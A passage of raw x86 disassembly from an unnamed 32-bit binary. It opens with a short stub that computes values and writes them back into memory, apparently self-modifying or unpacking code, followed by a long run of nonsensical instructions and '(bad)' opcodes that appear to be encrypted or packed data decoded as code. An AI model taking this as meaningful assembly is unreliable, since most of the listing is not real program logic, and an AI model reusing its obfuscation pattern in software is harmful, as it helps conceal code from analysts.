  403803:	inc    ebp
  403804:	shl    BYTE PTR [ebx],1
  403806:	mov    BYTE PTR [ebx],0xc7
  403809:	push   eax
  40380a:	mov    eax,DWORD PTR [ebp-0x2c]
  40380d:	add    eax,0xaa
  403812:	push   eax
  403813:	mov    eax,DWORD PTR [ebp-0x2c]
  403816:	mov    eax,DWORD PTR [eax+0x198]
  40381c:	push   DWORD PTR [eax]
  40381e:	call   0x405c89
  403823:	mov    DWORD PTR [ebp-0x40],eax
  403826:	lea    eax,[ebp+0x4]
  403829:	mov    DWORD PTR [ebp-0x34],eax
  40382c:	mov    eax,DWORD PTR [ebp-0x8]
  40382f:	mov    eax,DWORD PTR [eax]
  403831:	mov    eax,DWORD PTR [eax]
  403833:	mov    eax,DWORD PTR [eax]
  403835:	test   eax,eax
  403837:	je     0x405c7a
  40383d:	lea    eax,[ebp-0xc]
  403840:	mov    DWORD PTR [ebp-0x4c],eax
  403843:	mov    eax,DWORD PTR [ebp-0x3c]
  403846:	mov    DWORD PTR [ebp-0xc],eax
  403849:	mov    eax,DWORD PTR [ebp-0x8]
  40384c:	mov    eax,DWORD PTR [eax]
  40384e:	mov    eax,DWORD PTR [eax]
  403850:	mov    eax,DWORD PTR [eax]
  403852:	sub    DWORD PTR [ebp-0xc],eax
  403855:	mov    ecx,DWORD PTR [ebp-0x10]
  403858:	xor    ecx,esi
  40385a:	mov    eax,0xffcd8d25
  40385f:	sub    eax,ecx
  403861:	add    DWORD PTR [ebp-0xc],eax
  403864:	mov    eax,DWORD PTR [ebp-0xc]
  403867:	mov    ecx,DWORD PTR [ebp-0x8]
  40386a:	mov    ecx,DWORD PTR [ecx]
  40386c:	mov    ecx,DWORD PTR [ecx]
  40386e:	mov    ecx,DWORD PTR [ecx]
  403870:	mov    DWORD PTR [ecx+0x1],eax
  403873:	mov    al,BYTE PTR [ebp-0x1]
  403876:	mov    ecx,DWORD PTR [ebp-0x8]
  403879:	mov    ecx,DWORD PTR [ecx]
  40387b:	mov    ecx,DWORD PTR [ecx]
  40387d:	mov    ecx,DWORD PTR [ecx]
  40387f:	push   DWORD PTR [ebp-0x2c]
  403882:	xor    al,0x6f
  403884:	sub    al,0xd
  403886:	mov    BYTE PTR [ecx],al
  403888:	jmp    0x405c4a
  40388d:	lods   eax,DWORD PTR ds:[esi]
  40388e:	mov    bh,0xe6
  403890:	ja     0x403876
  403892:	mov    ds:0xa508636b,eax
  403897:	fs (bad) 
  40389a:	stc    
  40389b:	les    edi,FWORD PTR [ebp+ebx*8-0x229d9da1]
  4038a2:	pop    edi
  4038a3:	bound  esp,QWORD PTR [edx+0x13]
  4038a6:	fucomip st,st(3)
  4038a8:	loop   0x40391c
  4038aa:	add    ah,BYTE PTR [ecx+0x2e3dff0b]
  4038b0:	xor    edi,DWORD PTR [edx+ebx*8]
  4038b3:	cmp    DWORD PTR [ebp+edx*8+0x6f],ecx
  4038b7:	push   esp
  4038b8:	mov    edx,0x424575ae
  4038bd:	imul   esi,DWORD PTR [eax],0x9b31bfd5
  4038c3:	mov    bl,0xdb
  4038c5:	fs loope 0x403856
  4038c8:	pop    es
  4038c9:	stos   BYTE PTR es:[edi],al
  4038ca:	icebp  
  4038cb:	(bad)  
  4038cd:	dec    esi
  4038ce:	test   DWORD PTR [edi+ebx*4],0x753038c3
  4038d5:	sub    eax,0xd6d46dc3
  4038da:	add    eax,0xdbf147e2
  4038df:	cli    
  4038e0:	nop
  4038e1:	inc    esi
  4038e2:	inc    edi
  4038e3:	push   ebx
  4038e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4038e5:	mov    ebp,0x435766ba
  4038ea:	lahf   
  4038eb:	mov    edi,0xa9253f45
  4038f0:	sub    eax,0x8551dc79
  4038f5:	push   cs
  4038f6:	sbb    al,0x2b
  4038f8:	and    DWORD PTR [ebx],ebp
  4038fa:	ins    DWORD PTR es:[edi],dx
  4038fb:	stc    
  4038fc:	ss push eax
  4038fe:	cs add al,0x6d
  403901:	push   eax
  403902:	fidiv  WORD PTR [ebx+ecx*1]
  403905:	outs   dx,DWORD PTR ds:[esi]
  403906:	jl     0x403895
  403908:	xor    al,0xfd
  40390a:	lock mov dh,0xc
  40390d:	adc    eax,DWORD PTR [ebp+0x51]
  403910:	pop    ds
  403911:	outs   dx,BYTE PTR ds:[esi]
  403912:	xchg   edx,eax
  403913:	sub    al,0xd5
  403915:	sti    
  403916:	pop    esp
  403917:	cmp    DWORD PTR [ebx-0x57401510],ebx
  40391d:	adc    eax,0x547cfefe
  403922:	in     eax,dx
  403923:	pop    ss
  403924:	imul   eax,DWORD PTR [ecx+0x7],0xc65ca1a5
  40392b:	clc    
  40392c:	mov    edx,0x98c07f15
  403931:	xlat   BYTE PTR ds:[ebx]
  403932:	lods   al,BYTE PTR ds:[esi]
  403933:	adc    eax,0x4bde2dce
  403938:	dec    edx
  403939:	mov    ecx,0x5350f4f7
  40393e:	and    eax,0x94eead19
  403943:	nop
  403944:	inc    eax
  403945:	mov    edi,ss
  403947:	(bad)  
  403948:	imul   edi,eax,0xec4bd082
  40394e:	mov    al,0x36
  403950:	adc    ah,BYTE PTR [eax+0x12]
  403953:	pop    ecx
  403954:	mov    ds:0xc61090c6,eax
  403959:	call   0x68e12746
  40395e:	xchg   edx,eax
  40395f:	add    ebx,DWORD PTR [ebx+0x62bd22bd]
  403965:	mov    ebp,0x884053c
  40396a:	lods   al,BYTE PTR ss:[esi]
  40396c:	mov    ds:0xd0f8b722,al
  403971:	nop
  403972:	scas   eax,DWORD PTR es:[edi]
  403973:	mov    es,eax
  403975:	(bad)  
  403976:	and    eax,0x503eb460
  40397b:	cld    
  40397c:	aaa    
  40397d:	repz mov edx,0xf1631ffc
  403983:	call   esi
  403985:	shr    BYTE PTR [ebx-0x28],cl
  403988:	and    BYTE PTR [esi-0x14c90aa1],dh
  40398e:	cmp    al,0x8d
  403990:	sbb    dl,BYTE PTR [esi-0x52]
  403993:	mov    ebx,0xc17fc2d5
  403998:	sti    
  403999:	ss out dx,al
  40399b:	or     BYTE PTR [esi],0x5d
  40399e:	push   eax
  40399f:	pop    ss
  4039a0:	adc    DWORD PTR [ebx+0x33],esi
  4039a3:	outs   dx,DWORD PTR ds:[esi]
  4039a4:	(bad)  
  4039a5:	je     0x403986
  4039a7:	imul   ebx,DWORD PTR [edx-0x66],0x55
  4039ab:	pop    ds
  4039ac:	std    
  4039ad:	adc    al,0x5f
  4039af:	xchg   BYTE PTR [esi+0x3892f020],ah
  4039b5:	out    dx,eax
  4039b6:	sub    eax,0x8bc8e965
  4039bb:	sbb    ah,ah
  4039bd:	sbb    bh,al
  4039bf:	scas   al,BYTE PTR es:[edi]
  4039c0:	mov    al,0xd5
  4039c2:	adc    ebx,esi
  4039c4:	pop    ss
  4039c5:	mov    ah,0x39
  4039c7:	sub    DWORD PTR [edx+0x187fde16],ebx
  4039cd:	sub    DWORD PTR [ecx-0xb],ecx
  4039d0:	push   0xffffff8e
  4039d2:	in     eax,0xa4
  4039d4:	(bad)  
  4039d5:	out    0x9a,eax
  4039d7:	lods   al,BYTE PTR ds:[esi]
  4039d8:	clc    
  4039d9:	mov    esp,0xab502cc4
  4039de:	inc    edx
  4039df:	xor    eax,DWORD PTR [ecx-0x4edddc53]
  4039e5:	(bad)  
  4039e6:	das    
  4039e7:	add    eax,0xeb758be5
  4039ec:	mov    edx,0xa3d1e32
  4039f1:	or     BYTE PTR [edx+0x28],0x14
  4039f5:	and    al,BYTE PTR [eax-0x3d]
  4039f8:	call   0x943a:0x799e19a7
  4039ff:	loopne 0x403a3f
  403a01:	in     al,0x36
  403a03:	add    DWORD PTR [esp+ebp*8+0x299fc354],0x77d237a5
  403a0e:	cmp    ecx,DWORD PTR [edi-0x30]
  403a11:	pop    ss
  403a12:	sti    
  403a13:	shl    BYTE PTR [edi],0xec
  403a16:	(bad)  
  403a17:	rsm    
  403a19:	mov    DWORD PTR [edx],esi
  403a1b:	stos   BYTE PTR es:[edi],al
  403a1c:	adc    esi,DWORD PTR [ebx-0x1d5f9f31]
  403a22:	push   es
  403a23:	ror    BYTE PTR [eax],0xc1
  403a26:	ins    BYTE PTR es:[edi],dx
  403a27:	dec    edi
  403a28:	ins    DWORD PTR es:[edi],dx
  403a29:	mov    ?,WORD PTR [edx+0x7c41cbf9]
  403a2f:	ja     0x403a2e
  403a31:	dec    edx
  403a32:	ffreep st(0)
  403a34:	test   edi,edx
  403a36:	or     esp,eax
  403a38:	jl     0x4039c7
  403a3a:	retf   
  403a3b:	sahf   
  403a3c:	adc    ebp,DWORD PTR [ebx+0x7f199d3b]
  403a42:	jb     0x403a30
  403a44:	mov    gs,WORD PTR [eax]
  403a46:	out    dx,eax
  403a47:	lahf   
  403a48:	adc    ebp,DWORD PTR [ecx+0x79]
  403a4b:	or     BYTE PTR [ebx-0x64],ch
  403a4e:	xchg   esi,eax
  403a4f:	dec    eax
  403a50:	mov    ebx,0x2313d6eb
  403a55:	in     eax,dx
  403a56:	addr16 sbb al,0x7
  403a59:	add    esp,eax
  403a5b:	cmc    
  403a5c:	mov    ch,0x72
  403a5e:	jno    0x403a5d
  403a60:	dec    eax
  403a61:	jo     0x403a47
  403a63:	inc    eax
  403a64:	dec    BYTE PTR [esp+eax*4]
  403a67:	mov    ds:0xe0d29f96,al
  403a6c:	adc    eax,0xef62f345
  403a71:	retf   0x889b
  403a74:	pop    edi
  403a75:	outs   dx,DWORD PTR ds:[esi]
  403a76:	aas    
  403a77:	push   esp
  403a78:	shl    BYTE PTR [ecx+0x6964562f],0x4
  403a7f:	repz jmp 0x681c98f9
  403a85:	jae    0x403ab4
  403a87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403a88:	nop
  403a89:	sbb    DWORD PTR [esi+0x68dc1685],edx
  403a8f:	sub    al,0x7e
  403a91:	mov    bl,0x80
  403a93:	les    ebp,FWORD PTR [esi-0x13e76890]
  403a99:	ins    BYTE PTR es:[edi],dx
  403a9a:	(bad)  
  403a9b:	stos   DWORD PTR es:[edi],eax
  403a9c:	fnstcw WORD PTR [edi-0x1d]
  403a9f:	aas    
  403aa0:	inc    BYTE PTR [edx+0x2e]
  403aa3:	pop    ebx
  403aa4:	call   FWORD PTR [edi+eiz*8+0x4a]
  403aa8:	aad    0xb3
  403aaa:	mov    ch,0xde
  403aac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403aad:	xchg   ebp,eax
  403aae:	sbb    eax,DWORD PTR [ebp-0x7b]
  403ab1:	sti    
  403ab2:	in     eax,dx
  403ab3:	mov    edx,0xf154e429
  403ab8:	mov    eax,ds:0x614eabad
  403abd:	div    BYTE PTR [esi-0x46216950]
  403ac3:	inc    edx
  403ac4:	jo     0x403b2d
  403ac6:	push   esi
  403ac7:	add    eax,0xbaf2da91
  403acc:	sbb    bl,BYTE PTR [eax+eiz*8]
  403acf:	loopne 0x403a7c
  403ad1:	cld    
  403ad2:	mov    WORD PTR [eax+0x35],ds
  403ad5:	mov    edi,0xfa47a567
  403ada:	(bad)  
  403adb:	sub    al,0x92
  403add:	inc    ebx
  403ade:	xor    ah,ch
  403ae0:	mov    ch,0x3b
  403ae2:	mov    esp,0x552c36e3
  403ae7:	inc    edi
  403ae8:	sub    ebx,DWORD PTR [edx-0x5a]
  403aeb:	fisubr DWORD PTR [eax-0x71651b26]
  403af1:	leave  
  403af2:	pop    ebp
  403af3:	cdq    
  403af4:	leave  
  403af5:	imul   ecx,DWORD PTR [eax+0x2],0x634b776c
  403afc:	js     0x403ac8
  403afe:	xchg   DWORD PTR [esi*2+0x58783de4],edx
  403b05:	in     eax,0x9e
  403b07:	and    al,0xfd
  403b09:	inc    esi
  403b0a:	in     eax,dx
  403b0b:	adc    eax,0x92bd9fbf
  403b10:	cmc    
  403b11:	stc    
  403b12:	cmp    dl,BYTE PTR [edi]
  403b14:	pop    ebx
  403b15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403b16:	cmp    eax,0x43cec221
  403b1b:	cli    
  403b1c:	jno    0x403b12
  403b1e:	or     al,0xf5
  403b20:	sbb    edi,esp
  403b22:	xor    al,0xf
  403b24:	xchg   esp,eax
  403b25:	pushf  
  403b26:	jno    0x403af8
  403b28:	and    bl,0x6e
  403b2b:	in     al,0xd2
  403b2d:	add    eax,0xe4298469
  403b32:	sbb    cl,dl
  403b34:	jecxz  0x403af4
  403b36:	daa    
  403b37:	sbb    cl,al
  403b39:	sub    edx,DWORD PTR [edx+0x5c]
  403b3c:	lods   al,BYTE PTR ds:[esi]
  403b3d:	fwait
  403b3e:	xor    DWORD PTR [eax-0x49],ebp
  403b41:	f2xm1  
  403b43:	and    al,0xdd
  403b46:	cs and al,0xa3
  403b49:	xlat   BYTE PTR ds:[ebx]
  403b4a:	lods   eax,DWORD PTR ds:[esi]
  403b4b:	mov    dl,ch
  403b4d:	jns    0x403b49
  403b4f:	push   ebx
  403b50:	sbb    eax,edi
  403b52:	xor    ebx,DWORD PTR [ebx+edi*4]
  403b55:	mov    bh,0x16
  403b57:	popw   ss
  403b59:	bound  esp,QWORD PTR [esi-0x7f92519b]
  403b5f:	mov    ebp,0xabde6b2c
  403b64:	jno    0x403b2c
  403b66:	cld    
  403b67:	jp     0x403b1e
  403b69:	or     esi,ebx
  403b6b:	test   BYTE PTR [ecx-0x41d05e59],ah
  403b71:	cmp    ecx,DWORD PTR ds:0x66d6101b
  403b77:	lods   al,BYTE PTR ds:[esi]
  403b78:	xchg   ebp,eax
  403b79:	push   es
  403b7a:	mov    ebx,DWORD PTR [edi-0x7f]
  403b7d:	sub    BYTE PTR [ecx],ah
  403b7f:	jmp    0xbd7b:0x8c9ae39e
  403b86:	imul   eax,DWORD PTR [ebp+0x7781efad],0xdb388baf
  403b90:	(bad)  
  403b91:	xchg   ecx,eax
  403b92:	xchg   esi,eax
  403b93:	pop    es
  403b94:	fstp   TBYTE PTR [edx]
  403b96:	sub    eax,0x650cd6ab
  403b9b:	xchg   DWORD PTR [edi+0x5],esp
  403b9e:	sub    ebp,DWORD PTR [eax-0x51]
  403ba1:	loopne 0x403bb6
  403ba3:	and    BYTE PTR [ebx+ecx*2-0x23],cl
  403ba7:	and    ebx,DWORD PTR [esi-0x59]
  403baa:	pop    ebx
  403bab:	xchg   edx,eax
  403bac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403bad:	or     DWORD PTR [eax-0x38da3e7b],eax
  403bb3:	aas    
  403bb4:	jg     0x403c03
  403bb6:	inc    esp
  403bb7:	or     BYTE PTR [edi],dh
  403bb9:	outs   dx,BYTE PTR ds:[esi]
  403bba:	ins    DWORD PTR es:[edi],dx
  403bbb:	sahf   
  403bbc:	(bad)  
  403bbd:	mov    edi,0x61f980f8
  403bc2:	push   ecx
  403bc3:	pop    es
  403bc4:	jmp    0x9976aba6
  403bc9:	push   ebp
  403bca:	imul   edx,DWORD PTR [ebx+ebp*1],0xa
  403bce:	fdivp  st(3),st
  403bd0:	arpl   WORD PTR [esi],sp
  403bd2:	(bad)  
  403bd3:	loope  0x403b5e
  403bd5:	pushf  
  403bd6:	not    BYTE PTR [edi+ecx*1+0x42a8df50]
  403bdd:	adc    BYTE PTR [edi],al
  403bdf:	inc    edi
  403be0:	ja     0x403b62
  403be2:	mov    ebp,0xa525961d
  403be7:	or     al,0xc3
  403be9:	and    ah,cl
  403beb:	dec    edx
  403bec:	dec    edi
  403bed:	mov    al,BYTE PTR [ebx]
  403bef:	sbb    eax,0xe8ad8374
  403bf4:	xchg   ecx,eax
  403bf5:	adc    DWORD PTR [ecx+0x310b884e],esp
  403bfb:	(bad)  
  403bfc:	ins    DWORD PTR es:[edi],dx
  403bfd:	loope  0x403c5a
  403bff:	cmp    al,0xf3
  403c01:	cmp    dh,BYTE PTR [esi+0x48]
  403c04:	(bad)  
  403c05:	jbe    0x403bc1
  403c07:	dec    edi
  403c08:	fimul  WORD PTR [eax-0x6fbb65d4]
  403c0e:	dec    ebp
  403c0f:	cmc    
  403c10:	stc    
  403c11:	hlt    
  403c12:	xchg   esp,eax
  403c13:	fdiv   DWORD PTR [edx+0x68]
  403c16:	mov    esi,DWORD PTR [edi+0xc]
  403c19:	or     bh,bh
  403c1b:	js     0x403c23
  403c1d:	mov    bh,0x24
  403c1f:	stc    
  403c20:	(bad)  
  403c21:	and    DWORD PTR [ebx-0x4],eax
  403c24:	repz test esi,ecx
  403c27:	sub    al,0x15
  403c29:	je     0x403c42
  403c2b:	cmp    al,0xc1
  403c2d:	adc    eax,0xaa6f3e86
  403c32:	psrad  mm2,QWORD PTR [edx]
  403c35:	or     cl,BYTE PTR [edx-0x439a2513]
  403c3b:	mov    ds:0x8f74a245,eax
  403c40:	push   ebp
  403c41:	in     al,0xcd
  403c43:	adc    al,0x89
  403c45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c46:	(bad)  
  403c47:	pusha  
  403c48:	aam    0xa7
  403c4a:	cmp    BYTE PTR [eax+eiz*8-0x5b6cc103],dh
  403c51:	adc    al,0x35
  403c53:	or     al,0xd
  403c55:	add    dh,al
  403c57:	jmp    0xfdb3:0xd0b335ba
  403c5e:	jnp    0x403c63
  403c60:	push   esp
  403c61:	and    ah,al
  403c63:	addr16 xchg esi,eax
  403c65:	and    ah,ch
  403c67:	push   0xffffffe8
  403c69:	sub    DWORD PTR [esp+ecx*1],edi
  403c6c:	imul   edi,DWORD PTR [eax-0x2c3cd131],0x49aa7d48
  403c76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c77:	not    BYTE PTR [ecx+0x24c30454]
  403c7d:	fwait
  403c7e:	xchg   ebp,eax
  403c7f:	cmp    BYTE PTR ds:0xedcba2bf,bl
  403c85:	xchg   ebx,ebp
  403c87:	sbb    eax,0x5ea30f71
  403c8c:	gs test al,0x60
  403c8f:	data16 mov cl,0xbb
  403c92:	neg    BYTE PTR [ebx]
  403c94:	dec    ebx
  403c95:	icebp  
  403c96:	mov    ds:0x265c5cc6,al
  403c9b:	test   eax,0x51217903
  403ca0:	mov    ch,0x64
  403ca2:	sbb    DWORD PTR [ebx],0xfffffffd
  403ca5:	dec    edx
  403ca6:	ins    DWORD PTR es:[edi],dx
  403ca7:	push   es
  403ca8:	out    0xf,eax
  403caa:	aaa    
  403cab:	jle    0x403caf
  403cad:	div    BYTE PTR [edx+0x23fbd583]
  403cb3:	mov    ds:0x51dcc7b7,eax
  403cb8:	not    BYTE PTR [eax]
  403cba:	or     esp,DWORD PTR [ecx+0x413a6f04]
  403cc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403cc1:	sub    eax,0xe3b985b2
  403cc6:	mov    ebp,0x4e152c05
  403ccb:	jl     0x403d41
  403ccd:	jle    0x403cfc
  403ccf:	cmp    BYTE PTR [eax],0x52
  403cd2:	pop    ds
  403cd3:	jmp    0x82624052
  403cd8:	add    al,0x28
  403cda:	mov    edx,0xa3a5a584
  403cdf:	jnp    0x403d2b
  403ce1:	jmp    0x403ce4
  403ce3:	mov    cl,0xe3
  403ce5:	mov    ds:0x79cfa6e1,eax
  403cea:	adc    BYTE PTR [edi-0x71f11fc1],bh
  403cf0:	cmp    dh,ah
  403cf2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403cf3:	fdiv   QWORD PTR [ebx+0x62]
  403cf6:	xor    al,0x38
  403cf8:	push   ebp
  403cf9:	sub    edx,DWORD PTR ds:0x2b987d20
  403cff:	mov    DWORD PTR [ebx+ebx*8-0x181d59d9],eax
  403d06:	adc    DWORD PTR [ecx+0x52],ecx
  403d09:	retf   0x513b
  403d0c:	dec    edi
  403d0d:	ss hlt 
  403d0f:	add    al,0xb9
  403d11:	mov    ds:0xc6fca336,al
  403d16:	mov    ebx,ebp
  403d18:	or     bh,BYTE PTR [ecx+0x25]
  403d1b:	mov    ch,0x47
  403d1d:	jbe    0x403cd3
  403d1f:	cmp    eax,0x831dcbb7
  403d24:	mov    ss,WORD PTR [edi+ecx*2+0x5e]
  403d28:	inc    eax
  403d29:	loop   0x403d2b
  403d2b:	fld    TBYTE PTR cs:[edx+edx*1]
  403d2f:	and    DWORD PTR [ebx-0x7],esp
  403d32:	inc    esi
  403d34:	sub    DWORD PTR [ebp+0x5e458d40],esi
  403d3a:	sbb    esp,DWORD PTR [edi-0x28]
  403d3d:	pushf  
  403d3e:	sub    ah,BYTE PTR [edi+0x3e9052bd]
  403d44:	pop    esi
  403d45:	mov    ds:0xbd37770,al
  403d4a:	and    DWORD PTR [ecx],eax
  403d4c:	cs nop
  403d4e:	push   ss
  403d4f:	ret    0x4a74
  403d52:	in     al,dx
  403d53:	sbb    BYTE PTR [esi],cl
  403d55:	mov    ch,0x56
  403d57:	call   DWORD PTR [edi-0x46]
  403d5a:	mov    ah,0xda
  403d5c:	das    
  403d5d:	mov    esi,0xb527682
  403d62:	mov    al,ds:0xe73149dc
  403d67:	psubusb mm7,QWORD PTR [eax]
  403d6a:	xor    BYTE PTR [edx+0x1d],0xab
  403d6e:	cmp    BYTE PTR [ecx-0x64],al
  403d71:	aad    0x9b
  403d73:	add    edi,ebx
  403d75:	dec    ebx
  403d76:	pop    ds
  403d77:	aaa    
  403d78:	jmp    0x847c3268
  403d7d:	rcl    BYTE PTR [edi],cl
  403d7f:	jle    0x403dd6
  403d81:	cmp    DWORD PTR [ecx+0x6f],esi
  403d84:	push   ecx
  403d85:	mov    esi,ebx
  403d87:	fs lock (bad) 
  403d8a:	ror    BYTE PTR [esp+esi*1-0xc784437],cl
  403d91:	(bad)  
  403d92:	fisttp DWORD PTR [ebx-0x187fab36]
  403d98:	loop   0x403df3
  403d9a:	mov    dl,0xf4
  403d9c:	mov    ds:0xf8db17cb,eax
  403da1:	pushf  
  403da2:	push   eax
  403da3:	fs test ecx,esp
  403da6:	add    BYTE PTR [ebx+edx*1],bh
  403da9:	dec    ebp
  403daa:	or     al,0x6b
  403dac:	dec    ecx
  403dad:	jne    0x403d2f
  403daf:	jbe    0x403e02
  403db1:	cmp    al,0xeb
  403db3:	cli    
  403db4:	mov    esi,0x5f1a0052
  403db9:	ret    0xe364
  403dbc:	call   0x8207:0xe61a170c
  403dc3:	push   ebx
  403dc4:	repnz mov esp,0x7b912d92
  403dca:	rcl    ebp,1
  403dcc:	imul   ecx,ecx,0x267a9e92
  403dd2:	jb     0x403e2a
  403dd4:	inc    eax
  403dd5:	pop    ecx
  403dd6:	icebp  
  403dd7:	push   ebp
  403dd8:	out    0x84,al
  403dda:	sbb    DWORD PTR [edi],esp
  403ddc:	jp     0x403d7f
  403dde:	or     BYTE PTR [edx],0x44
  403de1:	inc    eax
  403de2:	(bad)  
  403de3:	retf   0xed68
  403de6:	pusha  
  403de7:	add    bl,BYTE PTR [esp+eax*4+0x5d]
  403deb:	int    0x26
  403ded:	cmp    dl,BYTE PTR [ecx+0x15]
  403df0:	jp     0x403db6
  403df2:	jmp    0x403e6f
  403df4:	pop    edx
  403df5:	ret    
  403df6:	dec    eax
  403df7:	mov    esi,0x29ddee3d
  403dfc:	mov    esp,ebx
  403dfe:	leave  
  403dff:	sahf   
  403e00:	arpl   si,bx
  403e02:	lods   al,BYTE PTR ds:[esi]
  403e03:	dec    edi
  403e04:	jbe    0x403e36
  403e06:	xor    ah,BYTE PTR [edi-0x3e]
  403e09:	lds    ebx,FWORD PTR [ecx+0xefe4f5c]
  403e0f:	mul    ah
  403e11:	xchg   ecx,eax
  403e12:	jmp    0x403e04
  403e14:	neg    BYTE PTR [eax]
  403e16:	xchg   ecx,eax
  403e17:	imul   edx,ebx,0xcdb551fd
  403e1d:	jecxz  0x403dbe
  403e1f:	cmp    DWORD PTR [ebp-0x19],0x959f4970
  403e26:	and    dh,BYTE PTR [ebx-0x2359282c]
  403e2c:	or     eax,DWORD PTR [edx-0x13f34683]
  403e32:	dec    edx
  403e33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e34:	scas   eax,DWORD PTR es:[edi]
  403e35:	mov    esp,0x2bf5f66d
  403e3a:	int3   
  403e3b:	arpl   WORD PTR [ebp-0x1d],si
  403e3e:	xchg   BYTE PTR [edi+edi*2-0x60],al
  403e42:	add    DWORD PTR [esi],edx
  403e44:	daa    
  403e45:	xor    BYTE PTR fs:[ecx-0x20617b83],dl
  403e4c:	loopne 0x403e0a
  403e4e:	in     eax,0xeb
  403e50:	mov    WORD PTR [ebp+0x668f3b5d],ss
  403e56:	jmp    0xe332e5c0
  403e5b:	mov    cl,0xc6
  403e5d:	inc    ebp
  403e5e:	push   0xffffffa8
  403e60:	fst    QWORD PTR [ecx+0x7a20770b]
  403e66:	leave  
  403e67:	jae    0x403df2
  403e69:	and    DWORD PTR [ebx],esi
  403e6b:	push   sp
  403e6d:	ret    0x37bb
  403e70:	xor    dl,BYTE PTR [edi+0x5431d74]
  403e76:	inc    ebp
  403e77:	shl    DWORD PTR [ebx],1
  403e79:	ficom  WORD PTR [ebp+0x36]
  403e7c:	fcomp  QWORD PTR [ecx-0x7f]
  403e7f:	daa    
  403e80:	fst    QWORD PTR [ebx]
  403e82:	in     eax,0xa1
  403e84:	dec    esi
  403e85:	mov    bh,0xa8
  403e87:	mov    ah,0x9f
  403e89:	inc    DWORD PTR [edi+edi*1+0x28]
  403e8d:	retf   
  403e8e:	jnp    0xfdced787
  403e94:	sub    al,0x39
  403e96:	sahf   
  403e97:	data16 or al,0xd6
  403e9a:	loop   0x403eb0
  403e9c:	push   0x95dae7f1
  403ea1:	aad    0xeb
  403ea3:	pop    ebp
  403ea4:	mov    edi,0x21167a06
  403ea9:	or     ch,BYTE PTR [ecx-0x7a8c21e9]
  403eaf:	mov    ecx,0x1ae14ff0
  403eb4:	and    eax,0xadf7c209
  403eb9:	lds    esi,FWORD PTR [edi]
  403ebb:	jp     0x403e75
  403ebd:	xchg   esp,eax
  403ebe:	jge    0x403e6f
  403ec0:	sar    esp,1
  403ec2:	jle    0x403e4d
  403ec4:	adc    bl,dh
  403ec6:	mov    esp,0xae7dec4c
  403ecb:	js     0x403eaa
  403ecd:	cs data16 into 
  403ed0:	inc    ebp
  403ed1:	inc    eax
  403ed2:	test   al,0x88
  403ed4:	jnp    0x403eb1
  403ed6:	cwde   
  403ed7:	add    edi,DWORD PTR [eax-0x4a]
  403eda:	push   edi
  403edb:	jp     0x403f0c
  403edd:	mov    ebp,0xf2610e13
  403ee2:	xor    eax,DWORD PTR [esi-0x4f]
  403ee5:	(bad)  
  403ee6:	cmp    al,0x69
  403ee8:	rol    edi,cl
  403eea:	(bad)  
  403eec:	mov    gs,WORD PTR [esi]
  403eee:	nop
  403eef:	mov    edi,0x3b72bc46
  403ef4:	sub    esp,0xffffffe3
  403ef7:	stos   BYTE PTR es:[edi],al
  403ef8:	loopne 0x403f58
  403efa:	adc    esi,edx
  403efc:	pop    edi
  403efd:	mov    cs,WORD PTR gs:[ecx]
  403f00:	iret   
  403f01:	rol    ch,1
  403f03:	xchg   ebx,eax
  403f04:	mov    BYTE PTR [ebp+0x71],0xa8
  403f08:	xchg   ecx,eax
  403f09:	jo     0x403eda
  403f0b:	add    al,0x94
  403f0d:	test   eax,0x1679b2ad
  403f12:	frstor [eax]
  403f14:	outs   dx,BYTE PTR ds:[esi]
  403f15:	ret    
  403f16:	push   ecx
  403f17:	sbb    ebp,DWORD PTR [ecx+edi*8-0x75]
  403f1b:	dec    eax
  403f1c:	xchg   ebx,eax
  403f1d:	dec    edx
  403f1e:	push   eax
  403f1f:	mov    ebx,0x59dc0b09
  403f24:	out    dx,al
  403f25:	(bad)  
  403f27:	push   0xae2f8acc
  403f2c:	add    dh,BYTE PTR [esi]
  403f2e:	ficomp WORD PTR [edi-0x4267dc6c]
  403f34:	(bad)  
  403f35:	out    0xd0,al
  403f37:	aas    
  403f38:	loopne 0x403eec
  403f3a:	arpl   di,bx
  403f3c:	in     eax,dx
  403f3d:	adc    BYTE PTR [eax],al
  403f3f:	sbb    al,0x7a
  403f41:	push   ecx
  403f42:	test   bh,bl
  403f44:	retf   0xb3e5
  403f47:	mul    DWORD PTR [edx]
  403f49:	iret   
  403f4a:	cs pushf 
  403f4c:	retf   
  403f4d:	or     DWORD PTR [edx-0x544b62f5],ecx
  403f53:	xchg   edx,eax
  403f54:	fild   WORD PTR [ebp+ecx*2+0x205eac61]
  403f5b:	sub    al,0x73
  403f5d:	or     eax,0x9574c907
  403f62:	jbe    0x403f65
  403f64:	push   ss
  403f65:	inc    ebx
  403f66:	aaa    
  403f67:	mov    ebp,0xe23fa4ab
  403f6c:	mov    eax,ds:0xa6ee8d0b
  403f71:	lock or eax,0xbf538bab
  403f77:	fld    st(6)
  403f79:	dec    edx
  403f7a:	mov    esp,0xacc029a7
  403f7f:	fucomip st,st(4)
  403f81:	or     DWORD PTR [ecx],esi
  403f83:	adc    bl,bh
  403f85:	or     ch,al
  403f87:	cwde   
  403f88:	add    al,BYTE PTR [edi+0x59]
  403f8b:	cld    
  403f8c:	pop    ecx
  403f8d:	lahf   
  403f8e:	mov    al,ds:0xe8ca0944
  403f93:	mov    dl,0x8f
  403f95:	mov    cs,edi
  403f97:	(bad)  
  403f98:	sar    BYTE PTR [eax+0x37e67f4d],cl
  403f9e:	push   ebp
  403f9f:	or     esi,DWORD PTR ds:0xa48fb452
  403fa5:	rcr    esi,0x1d
  403fa8:	imul   eax,DWORD PTR [ebx-0x69cf4fd3],0x254074ed
  403fb2:	xchg   BYTE PTR [ebp-0xc],dh
  403fb5:	push   es
  403fb6:	stc    
  403fb7:	mov    ebx,DWORD PTR [ebx-0x47]
  403fba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403fbb:	call   0xcc5b:0xe4da59b1
  403fc2:	inc    edx
